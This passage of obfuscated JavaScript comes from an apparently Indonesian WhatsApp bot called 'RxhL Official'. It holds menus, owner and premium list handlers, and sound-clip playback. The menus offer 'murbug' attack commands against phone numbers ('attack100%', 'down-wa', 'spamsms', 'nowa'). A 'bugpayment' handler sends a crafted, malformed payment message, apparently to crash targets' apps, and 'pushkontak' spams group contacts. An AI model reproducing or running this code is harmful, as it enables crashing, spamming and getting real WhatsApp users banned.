𝗥𝗮𝗻𝗱𝗼𝗺 𝗠𝘂𝗿𝗯𝘂𝗴 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "gasajabray 628xxx\n ➵ " + _0x11f9b4 + "down-wa 628xxx\n ➵ " + _0x11f9b4 + "memekslemeks 628xxx\n ➵ " + _0x11f9b4 + "hai-bray 628xxx\n ➵ " + _0x11f9b4 + "ngentotmurbug 628xxx\n ➵ " + _0x11f9b4 + "attack100% 628xxx\n";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "txtmenu":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n\n ⌜ 𝗧𝘅𝘁 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "txtban1\n ➵ " + _0x11f9b4 + "txtban2\n ➵ " + _0x11f9b4 + "txtban3\n";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "aksesmenu":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n\n ⌜ 𝗔𝗸𝘀𝗲𝘀 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "addowner 62xxx\n ➵ " + _0x11f9b4 + "dellowner 62xxx\n ➵ " + _0x11f9b4 + "addmurbug 62xxx\n ➵ " + _0x11f9b4 + "dellmurbug 62xxx\n ➵ " + _0x11f9b4 + "listowner\n ➵ " + _0x11f9b4 + "listmurbug\n";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "soundmenu":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n\n ⌜ 𝗦𝗼𝘂𝗻𝗱 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "sound1\n ➵ " + _0x11f9b4 + "sound2\n ➵ " + _0x11f9b4 + "sound3\n ➵ " + _0x11f9b4 + "sound4\n ➵ " + _0x11f9b4 + "sound5\n ➵ " + _0x11f9b4 + "sound6\n ➵ " + _0x11f9b4 + "sound7\n ➵ " + _0x11f9b4 + "sound8\n ➵ " + _0x11f9b4 + "sound9\n ➵ " + _0x11f9b4 + "sound10\n ➵ " + _0x11f9b4 + "sound11\n ➵ " + _0x11f9b4 + "sound12\n ➵ " + _0x11f9b4 + "sound13\n ➵ " + _0x11f9b4 + "sound14\n ➵ " + _0x11f9b4 + "sound15\n ➵ " + _0x11f9b4 + "sound16\n ➵ " + _0x11f9b4 + "sound17\n ➵ " + _0x11f9b4 + "sound18\n ➵ " + _0x11f9b4 + "sound18\n ➵ " + _0x11f9b4 + "sound20\n ➵ " + _0x11f9b4 + "sound21\n ➵ " + _0x11f9b4 + "sound22\n ➵ " + _0x11f9b4 + "sound23\n ➵ " + _0x11f9b4 + "sound24\n ➵ " + _0x11f9b4 + "sound25\n ➵ " + _0x11f9b4 + "sound26\n ➵ " + _0x11f9b4 + "sound27\n ➵ " + _0x11f9b4 + "sound28\n ➵ " + _0x11f9b4 + "sound29\n ➵ " + _0x11f9b4 + "sound30\n ➵ " + _0x11f9b4 + "sound31\n ➵ " + _0x11f9b4 + "sound32\n ➵ " + _0x11f9b4 + "sound33\n ➵ " + _0x11f9b4 + "sound34\n ➵ " + _0x11f9b4 + "sound35\n ➵ " + _0x11f9b4 + "sound36\n ➵ " + _0x11f9b4 + "sound37\n ➵ " + _0x11f9b4 + "sound38\n ➵ " + _0x11f9b4 + "sound39\n ➵ " + _0x11f9b4 + "sound40\n ➵ " + _0x11f9b4 + "sound41\n ➵ " + _0x11f9b4 + "sound42\n ➵ " + _0x11f9b4 + "sound43\n ➵ " + _0x11f9b4 + "sound44\n ➵ " + _0x11f9b4 + "sound45\n ➵ " + _0x11f9b4 + "sound46\n ➵ " + _0x11f9b4 + "sound47\n ➵ " + _0x11f9b4 + "sound48\n ➵ " + _0x11f9b4 + "sound49\n ➵ " + _0x11f9b4 + "sound50\n ➵ " + _0x11f9b4 + "sound51\n ➵ " + _0x11f9b4 + "sound52\n ➵ " + _0x11f9b4 + "sound53\n ➵ " + _0x11f9b4 + "sound54\n ➵ " + _0x11f9b4 + "sound55\n ➵ " + _0x11f9b4 + "sound56\n ➵ " + _0x11f9b4 + "sound57\n ➵ " + _0x11f9b4 + "sound58\n ➵ " + _0x11f9b4 + "sound59\n ➵ " + _0x11f9b4 + "sound60\n ➵ " + _0x11f9b4 + "sound61\n ➵ " + _0x11f9b4 + "sound62\n ➵ " + _0x11f9b4 + "sound63\n ➵ " + _0x11f9b4 + "sound64\n ➵ " + _0x11f9b4 + "sound65\n ➵ " + _0x11f9b4 + "sound66\n ➵ " + _0x11f9b4 + "sound67\n ➵ " + _0x11f9b4 + "sound68\n ➵ " + _0x11f9b4 + "sound69\n ➵ " + _0x11f9b4 + "sound70\n ➵ " + _0x11f9b4 + "sound71\n ➵ " + _0x11f9b4 + "sound72\n ➵ " + _0x11f9b4 + "sound73\n ➵ " + _0x11f9b4 + "sound74\n ➵ " + _0x11f9b4 + "sound75\n ➵ " + _0x11f9b4 + "sound76\n ➵ " + _0x11f9b4 + "sound77\n ➵ " + _0x11f9b4 + "sound78\n ➵ " + _0x11f9b4 + "sound79\n ➵ " + _0x11f9b4 + "sound80\n ➵ " + _0x11f9b4 + "sound81\n ➵ " + _0x11f9b4 + "sound82\n ➵ " + _0x11f9b4 + "sound83\n ➵ " + _0x11f9b4 + "sound84\n ➵ " + _0x11f9b4 + "sound85\n ➵ " + _0x11f9b4 + "sound86\n ➵ " + _0x11f9b4 + "sound87\n ➵ " + _0x11f9b4 + "sound88\n ➵ " + _0x11f9b4 + "sound89\n ➵ " + _0x11f9b4 + "sound90\n ➵ " + _0x11f9b4 + "sound91\n ➵ " + _0x11f9b4 + "sound92\n ➵ " + _0x11f9b4 + "sound93\n ➵ " + _0x11f9b4 + "sound94\n ➵ " + _0x11f9b4 + "sound95\n ➵ " + _0x11f9b4 + "sound96\n ➵ " + _0x11f9b4 + "sound97\n ➵ " + _0x11f9b4 + "sound98\n ➵ " + _0x11f9b4 + "sound99\n ➵ " + _0x11f9b4 + "sound100\n ➵ " + _0x11f9b4 + "sound101\n ➵ " + _0x11f9b4 + "sound102\n ➵ " + _0x11f9b4 + "sound103\n ➵ " + _0x11f9b4 + "sound104\n ➵ " + _0x11f9b4 + "sound105\n ➵ " + _0x11f9b4 + "sound106\n ➵ " + _0x11f9b4 + "sound107\n ➵ " + _0x11f9b4 + "sound108\n ➵ " + _0x11f9b4 + "sound109\n ➵ " + _0x11f9b4 + "sound110\n ➵ " + _0x11f9b4 + "sound111\n ➵ " + _0x11f9b4 + "sound112\n ➵ " + _0x11f9b4 + "sound113\n ➵ " + _0x11f9b4 + "sound114\n ➵ " + _0x11f9b4 + "sound115\n ➵ " + _0x11f9b4 + "sound116\n ➵ " + _0x11f9b4 + "sound117\n ➵ " + _0x11f9b4 + "sound118\n ➵ " + _0x11f9b4 + "sound119\n ➵ " + _0x11f9b4 + "sound120\n ➵ " + _0x11f9b4 + "sound121\n ➵ " + _0x11f9b4 + "sound122\n ➵ " + _0x11f9b4 + "sound123\n ➵ " + _0x11f9b4 + "sound124\n ➵ " + _0x11f9b4 + "sound125\n ➵ " + _0x11f9b4 + "sound126\n ➵ " + _0x11f9b4 + "sound127\n ➵ " + _0x11f9b4 + "sound128\n ➵ " + _0x11f9b4 + "sound129\n ➵ " + _0x11f9b4 + "sound130\n ➵ " + _0x11f9b4 + "sound131\n ➵ " + _0x11f9b4 + "sound132\n ➵ " + _0x11f9b4 + "sound133\n ➵ " + _0x11f9b4 + "sound134\n ➵ " + _0x11f9b4 + "sound135\n ➵ " + _0x11f9b4 + "sound136\n ➵ " + _0x11f9b4 + "sound137\n ➵ " + _0x11f9b4 + "sound138\n ➵ " + _0x11f9b4 + "sound139\n ➵ " + _0x11f9b4 + "sound140\n ➵ " + _0x11f9b4 + "sound141\n ➵ " + _0x11f9b4 + "sound142\n ➵ " + _0x11f9b4 + "sound143\n ➵ " + _0x11f9b4 + "sound144\n ➵ " + _0x11f9b4 + "sound145\n ➵ " + _0x11f9b4 + "sound146\n ➵ " + _0x11f9b4 + "sound147\n ➵ " + _0x11f9b4 + "sound148\n ➵ " + _0x11f9b4 + "sound149\n ➵ " + _0x11f9b4 + "sound150\n ➵ " + _0x11f9b4 + "sound151\n ➵ " + _0x11f9b4 + "sound152\n ➵ " + _0x11f9b4 + "sound153\n ➵ " + _0x11f9b4 + "sound154\n ➵ " + _0x11f9b4 + "sound155\n ➵ " + _0x11f9b4 + "sound156\n ➵ " + _0x11f9b4 + "sound157\n ➵ " + _0x11f9b4 + "sound158\n ➵ " + _0x11f9b4 + "sound159\n ➵ " + _0x11f9b4 + "sound160\n ➵ " + _0x11f9b4 + "sound161\n";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "groupmenu":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n\n ⌜ 𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "pushkontak *text*\n ➵ " + _0x11f9b4 + "bcgroup *text*\n ➵ " + _0x11f9b4 + "hidetag *text*\n ➵ " + _0x11f9b4 + "editsubjek *text*\n ➵ " + _0x11f9b4 + "editdesk *text*\n ➵ " + _0x11f9b4 + "inspect *link gc*\n ➵ " + _0x11f9b4 + "add *62xxx*\n ➵ " + _0x11f9b4 + "kick *62xxx*\n ➵ " + _0x11f9b4 + "promote *62xxx*\n ➵ " + _0x11f9b4 + "demote *62xxx*\n ➵ " + _0x11f9b4 + "linkgroup\n ➵ " + _0x11f9b4 + "resetlinkgc\n";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "rxhlmenu":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n\n ⌜ 𝗥𝘅𝗵𝗟 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "resetotp *62xx*\n ➵ " + _0x11f9b4 + "unbanned *62xx*\n ➵ " + _0x11f9b4 + "unbannedv2 *62xx*\n ➵ " + _0x11f9b4 + "unbannedv3 *62xx*\n ➵ " + _0x11f9b4 + "spamsms *62xx*\n ➵ " + _0x11f9b4 + "nowa *62xx*\n";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "stickermenu":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n\n ⌜ 𝗦𝘁𝗶𝗰𝗸𝗲𝗿 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "attp *text*\n ➵ " + _0x11f9b4 + "sticker\n ➵ " + _0x11f9b4 + "smeme\n";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "downloadmenu":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n\n ⌜ 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "tiktokmp3 *link*\n ➵ " + _0x11f9b4 + "ytmp3 *link*\n ➵ " + _0x11f9b4 + "startytmp3 *judul*\n ➵ " + _0x11f9b4 + "yts *judul*";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "toolsmenu":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n\n ⌜ 𝙏𝙤𝙤𝙡𝙨 𝙈𝙚𝙣𝙪 ⌟\n ➵ " + _0x11f9b4 + "style *teks*\n ➵ " + _0x11f9b4 + "fliptext *teks*\n ➵ " + _0x11f9b4 + "tourl *reply media*\n";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "asupanmenu":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n\n ⌜ 𝗔𝘀𝘂𝗽𝗮𝗻 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "tiktokgirl \n ➵ " + _0x11f9b4 + "tiktoknukthy \n ➵ " + _0x11f9b4 + "tiktokkayes\n ➵ " + _0x11f9b4 + "tiktokpanrika\n ➵ " + _0x11f9b4 + "tiktoknotnot\n ➵ " + _0x11f9b4 + "tiktokghea\n ➵ " + _0x11f9b4 + "tiktoksantuy\n ➵ " + _0x11f9b4 + "paptt\n";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "jbmenu":
        await _0x333a9e();
        ewe = "*Hai " + _0x4cb438 + " 👋\n \n ⌜ 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘀𝗶 𝗕𝗼𝘁 𝗥𝘅𝗵𝗟 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ⌟\n ➜ Creator: RxhL Official\n ➜ Partner: -\n ➜ Type: Case\n ➜ Status: Online\n ➜ Mode: " + (_0x2f9d2e["public"] ? "Public" : "Self") + "\n ➜ Prefix : Multi \n \n ⌜ 𝗢𝘄𝗻𝗲𝗿 𝗕𝗼𝘁 𝗙𝗶𝘁𝘂𝗿 ⌟\n ❯ " + _0x11f9b4 + "self\n ❯ " + _0x11f9b4 + "public\n ❯ " + _0x11f9b4 + "blok *628xxx*\n ❯ " + _0x11f9b4 + "unblok *628xxx*\n ❯ " + _0x11f9b4 + "settppbot\n ❯ " + _0x11f9b4 + "settppbot /full\n\n ⌜ 𝗝𝗕 𝗠𝗲𝗻𝘂 ⌟\n ➵ " + _0x11f9b4 + "payment \n ➵ " + _0x11f9b4 + "pushkontak *text*\n ➵ " + _0x11f9b4 + "bcgroup *text*\n";
        _0x2f9d2e.nampil(ewe, _0x537416, _0x18a4d7);
        break;
      case "bugpayment":
        if (!_0x4d4b5c) {
          return _0x41d276(global.nocreator);
        }
        const _0x5e958a = {
          text: "𓁿 •RXHL OFFICIAL• 𓁿"
        };
        var _0x4e1830 = generateWAMessageFromContent(_0x537416, proto.Message.fromObject({
          'requestPaymentMessage': {
            'currencyCodeIso4217': "IDR",
            'amount1000': "100",
            'extendeqtextMessage': _0x5e958a
          }
        }), {
          'userJid': _0x537416,
          'quoted': _0x18a4d7
        });
        _0x2f9d2e.relayMessage(_0x537416, _0x4e1830.message, {
          'messageId': _0x4e1830.key.id
        });
        break;
      case "addowner":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!_0xe61016[0]) {
          return _0x41d276("Use " + (_0x11f9b4 + _0x63bd7f) + " Number\nExample " + (_0x11f9b4 + _0x63bd7f) + " 50663646464");
        }
        bnnd = _0x2a2cee.split('|')[0].replace(/[^0-9]/g, '');
        let _0x27453e = await _0x2f9d2e.onWhatsApp(bnnd + "@s.whatsapp.net");
        if (_0x27453e.length == 0) {
          return _0x41d276("Enter a valid number and register on WhatsApp!!!");
        }
        _0x340bea.push(bnnd);
        _0x5f1fae.push(bnnd);
        fs.writeFileSync("./lib/owner.json", JSON.stringify(_0x340bea));
        fs.writeFileSync("./lib/murbug.json", JSON.stringify(_0x5f1fae));
        _0x41d276("Number " + bnnd + " Has Been Added to Premium!!!");
        break;
      case "dellowner":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!_0xe61016[0]) {
          return _0x41d276("Use " + (_0x11f9b4 + _0x63bd7f) + " Number\nExample " + (_0x11f9b4 + _0x63bd7f) + " 50663646464");
        }
        yaki = _0x2a2cee.split('|')[0].replace(/[^0-9]/g, '');
        unp = _0x340bea.indexOf(yaki);
        anp = _0x5f1fae.indexOf(yaki);
        _0x340bea.splice(unp, 1);
        _0x5f1fae.splice(anp, 1);
        fs.writeFileSync("./lib/owner.json", JSON.stringify(_0x340bea));
        fs.writeFileSync("./lib/murbug.json", JSON.stringify(_0x5f1fae));
        _0x41d276("Number " + yaki + " Has Been Removed From Premium!!!");
        break;
      case "addmurbug":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!_0xe61016[0]) {
          return _0x41d276("Use " + (_0x11f9b4 + _0x63bd7f) + " Number\nExample " + (_0x11f9b4 + _0x63bd7f) + " 50663646464");
        }
        bnnd = _0x2a2cee.split('|')[0].replace(/[^0-9]/g, '');
        let _0xa18f9f = await _0x2f9d2e.onWhatsApp(bnnd + "@s.whatsapp.net");
        if (_0xa18f9f.length == 0) {
          return _0x41d276("Enter a valid number and register on WhatsApp!!!");
        }
        _0x5f1fae.push(bnnd);
        fs.writeFileSync("./lib/murbug.json", JSON.stringify(_0x5f1fae));
        _0x41d276("Number " + bnnd + " Has Been Added to Murbug!!!");
        break;
      case "dellmurbug":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        if (!_0xe61016[0]) {
          return _0x41d276("Use " + (_0x11f9b4 + _0x63bd7f) + " Number\nExample " + (_0x11f9b4 + _0x63bd7f) + " 50663646464");
        }
        yaki = _0x2a2cee.split('|')[0].replace(/[^0-9]/g, '');
        unp = _0x5f1fae.indexOf(yaki);
        _0x5f1fae.splice(unp, 1);
        fs.writeFileSync("./lib/murbug.json", JSON.stringify(_0x5f1fae));
        _0x41d276("Number " + yaki + " Has Been Removed From Murbug!!!");
        break;
      case "listowner":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        teksooo = "*List User Vip*\n\n";
        for (let _0x2693e0 of _0x340bea) {
          teksooo += "- " + _0x2693e0 + "\n";
        }
        teksooo += "\n*Total : " + _0x340bea.length + '*';
        const _0x59fa8a = {
          mentionedJid: _0x340bea
        };
        const _0x4ad4a9 = {
          quoted: _0x18a4d7,
          contextInfo: _0x59fa8a
        };
        _0x2f9d2e.sendMessage(_0x537416, {
          'text': teksooo.trim()
        }, "extendeqtextMessage", _0x4ad4a9);
        break;
      case "listmurbug":
        if (!_0x4cefc4) {
          return _0x41d276(global.nocreator);
        }
        teksooo = "*List User Vip*\n\n";
        for (let _0x1dd737 of _0x5f1fae) {
          teksooo += "- " + _0x1dd737 + "\n";
        }
        teksooo += "\n*Total : " + _0x5f1fae.length + '*';
        const _0x428833 = {
          mentionedJid: _0x5f1fae
        };
        const _0x4b7990 = {
          quoted: _0x18a4d7,
          contextInfo: _0x428833
        };
        _0x2f9d2e.sendMessage(_0x537416, {
          'text': teksooo.trim()
        }, "extendeqtextMessage", _0x4b7990);
        break;
      case "sound1":
      case "sound2":
      case "sound3":
      case "sound4":
      case "sound5":
      case "sound6":
      case "sound7":
      case "sound8":
      case "sound9":
      case "sound10":
      case "sound11":
      case "sound12":
      case "sound13":
      case "sound14":
      case "sound15":
      case "sound16":
      case "sound17":
      case "sound18":
      case "sound19":
      case "sound20":
      case "sound21":
      case "sound22":
      case "sound23":
      case "sound24":
      case "sound25":
      case "sound26":
      case "sound27":
      case "sound28":
      case "sound29":
      case "sound30":
      case "sound31":
      case "sound32":
      case "sound33":
      case "sound34":
      case "sound35":
      case "sound36":
      case "sound37":
      case "sound38":
      case "sound39":
      case "sound40":
      case "sound41":
      case "sound42":
      case "sound43":
      case "sound44":
      case "sound45":
      case "sound46":
      case "sound47":
      case "sound48":
      case "sound49":
      case "sound50":
      case "sound51":
      case "sound52":
      case "sound53":
      case "sound54":
      case "sound55":
      case "sound56":
      case "sound57":
      case "sound58":
      case "sound59":
      case "sound60":
      case "sound61":
      case "sound62":
      case "sound63":
      case "sound64":
      case "sound65":
      case "sound66":
      case "sound67":
      case "sound68":
      case "sound69":
      case "sound70":
      case "sound71":
      case "sound72":
      case "sound73":
      case "sound74":
      case "sound75":
      case "sound76":
      case "sound77":
      case "sound78":
      case "sound79":
      case "sound80":
      case "sound81":
      case "sound82":
      case "sound83":
      case "sound84":
      case "sound85":
      case "sound86":
      case "sound87":
      case "sound88":
      case "sound89":
      case "sound90":
      case "sound91":
      case "sound92":
      case "sound93":
      case "sound94":
      case "sound95":
      case "sound96":
      case "sound97":
      case "sound98":
      case "sound99":
      case "sound100":
      case "sound101":
      case "sound102":
      case "sound103":
      case "sound104":
      case "sound105":
      case "sound106":
      case "sound107":
      case "sound108":
      case "sound109":
      case "sound110":
      case "sound111":
      case "sound112":
      case "sound113":
      case "sound114":
      case "sound115":
      case "sound116":
      case "sound117":
      case "sound118":
      case "sound119":
      case "sound120":
      case "sound121":
      case "sound122":
      case "sound123":
      case "sound124":
      case "sound125":
      case "sound126":
      case "sound127":
      case "sound128":
      case "sound129":
      case "sound130":
      case "sound131":
      case "sound132":
      case "sound133":
      case "sound134":
      case "sound135":
      case "sound136":
      case "sound137":
      case "sound138":
      case "sound139":
      case "sound140":
      case "sound141":
      case "sound142":
      case "sound143":
      case "sound144":
      case "sound145":
      case "sound146":
      case "sound147":
      case "sound148":
      case "sound149":
      case "sound150":
      case "sound151":
      case "sound152":
      case "sound153":
      case "sound154":
      case "sound155":
      case "sound156":
      case "sound157":
      case "sound158":
      case "sound159":
      case "sound160":
      case "sound161":
        await _0x333a9e();
        rxhlganteng = await getBuffer("https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/" + _0x63bd7f + ".mp3");
        const _0x19a816 = {
          audio: rxhlganteng,
          mimetype: "audio/mp4",
          ptt: true,
          contextInfo: {}
        };
        _0x19a816.contextInfo.externalAdReply = {};
        _0x19a816.contextInfo.externalAdReply.showAdAttribution = true;
        _0x19a816.contextInfo.externalAdReply.mediaType = 0x1;
        _0x19a816.contextInfo.externalAdReply.mediaUrl = "https://wa.me/50663646464";
        _0x19a816.contextInfo.externalAdReply.title = "RXHL MODS";
        _0x19a816.contextInfo.externalAdReply.sourceUrl = "https://wa.me/50663646464";
        _0x19a816.contextInfo.externalAdReply.thumbnail = _0x3a5321;
        await _0x2f9d2e.sendMessage(_0x537416, _0x19a816);
        break;
      case "pushkontak":
        {
          if (!_0x4cefc4) {
            return _0x41d276(global.nocreator);
          }
          if (!_0x18a4d7.isGroup) {
            return _0x41d276(global.noingroup);
          }
          if (!_0x2a2cee) {
            return _0x41d276(global.notext);
          }
          let _0x205914 = await _0x5e087d.filter(_0x1bb1f5 => _0x1bb1f5.id.endsWith(".net")).map(_0x55e08d => _0x55e08d.id);
